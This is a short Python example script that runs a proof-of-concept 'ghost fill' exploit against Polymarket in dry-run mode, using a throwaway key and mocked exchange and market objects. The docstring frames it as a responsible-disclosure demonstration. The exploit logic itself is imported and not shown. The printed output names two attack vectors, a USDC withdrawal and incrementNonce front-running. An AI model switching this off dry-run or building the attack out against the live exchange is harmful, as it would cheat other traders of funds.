"""
Example: Run the incrementNonce ghost fill PoC (dry run mode).

This demonstrates the exploit flow for responsible disclosure to Polymarket.
Runs in DRY RUN mode — no real transactions are sent.

Usage:
    uv run python examples/poc_nonce_frontrun.py
"""

from unittest.mock import MagicMock

from eth_account import Account

from dr_manhattan.models.market import Market
from dr_manhattan.strategies.nonce_frontrun_poc import NonceFrontrunPoC

# Generate a throwaway key for dry-run validation (never funded)
throwaway = Account.create()

# Mock exchange — we only need the config attrs, not a live CLOB connection
exchange = MagicMock()
exchange.private_key = throwaway.key.hex()
exchange.funder = "0x0000000000000000000000000000000000000001"
exchange.config = {"rpc_url": "https://polygon-rpc.com"}
exchange.POLYGON_RPC_URL = "https://polygon-rpc.com"
exchange.fetch_orderbook.return_value = {
    "best_bid": 0.48,
    "best_ask": 0.52,
}
exchange._resolve_token_id.return_value = "12345"

# Fake market
market = Market(
    id="0x" + "ab" * 32,
    question="Will BTC be above $97,500 on Feb 23?",
    outcomes=["Yes", "No"],
    close_time=None,
    volume=100000.0,
    liquidity=50000.0,
    prices={"Yes": 0.50, "No": 0.50},
    metadata={"conditionId": "0x" + "ab" * 32},
    tick_size=0.01,
)

print("=" * 60)
print("PoC: Polymarket Ghost Fill Exploit")
print("Vectors: USDC withdrawal + incrementNonce (both fired per cycle)")
print("Mode: DRY RUN (no real transactions)")
print("=" * 60)

poc = NonceFrontrunPoC(
    exchange=exchange,
    market=market,
    gas_multiplier=3.0,
    order_size=5.0,
    dry_run=True,
)

poc.run(cycles=1)

print("\nValidation complete. Both exploit vectors demonstrated.")
